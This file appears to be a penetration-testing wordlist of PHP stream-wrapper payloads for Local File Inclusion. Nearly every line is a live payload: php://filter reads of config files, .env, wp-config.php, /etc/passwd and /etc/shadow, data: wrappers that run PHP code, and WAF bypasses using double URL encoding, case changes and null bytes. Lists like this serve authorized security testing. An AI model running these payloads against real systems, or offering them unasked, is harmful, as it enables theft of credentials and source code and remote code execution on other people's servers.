# PHP Wrapper LFI Payloads
# For exploiting Local File Inclusion via PHP stream wrappers
# These can escalate LFI to RCE or sensitive data disclosure

# ==============================================================================
# php://filter - Read files with encoding (bypass WAF, extract PHP source)
# ==============================================================================

# Base64 encode to extract PHP source code (most common)
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../config.php
php://filter/convert.base64-encode/resource=../../config.php
php://filter/convert.base64-encode/resource=../../../config.php
php://filter/convert.base64-encode/resource=/var/www/html/index.php
php://filter/convert.base64-encode/resource=/var/www/html/config.php
php://filter/convert.base64-encode/resource=/etc/passwd

# Read common config files
php://filter/convert.base64-encode/resource=wp-config.php
php://filter/convert.base64-encode/resource=configuration.php
php://filter/convert.base64-encode/resource=settings.php
php://filter/convert.base64-encode/resource=database.php
php://filter/convert.base64-encode/resource=db.php
php://filter/convert.base64-encode/resource=.env
php://filter/convert.base64-encode/resource=../.env

# Read without encoding (may work when filter is blocked)
php://filter/resource=index.php
php://filter/resource=/etc/passwd
php://filter/resource=/etc/shadow

# ROT13 encoding (alternative when base64 is blocked)
php://filter/read=string.rot13/resource=index.php
php://filter/read=string.rot13/resource=config.php

# UTF encoding conversions
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/convert.iconv.utf-16.utf-8/resource=index.php

# Zlib compression (may bypass WAF)
php://filter/zlib.deflate/resource=index.php
php://filter/zlib.inflate/resource=compressed_file

# Chained filters (may bypass certain protections)
php://filter/read=convert.base64-encode|convert.base64-encode/resource=index.php
php://filter/convert.base64-decode|convert.base64-encode/resource=index.php

php://input

# Alternative encodings
data:text/plain,<?php phpinfo();?>
data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+

# ==============================================================================
# BYPASSES - When basic wrappers are blocked
# ==============================================================================

# Double URL encoding
php%253A%252F%252Ffilter%252Fconvert.base64-encode%252Fresource%253Dindex.php

# Case variations
PHP://filter/convert.base64-encode/resource=index.php
Php://filter/convert.base64-encode/resource=index.php

# Null byte injection (older PHP versions)

php://filter/convert.base64-encode/resource=index.php%00.jpg
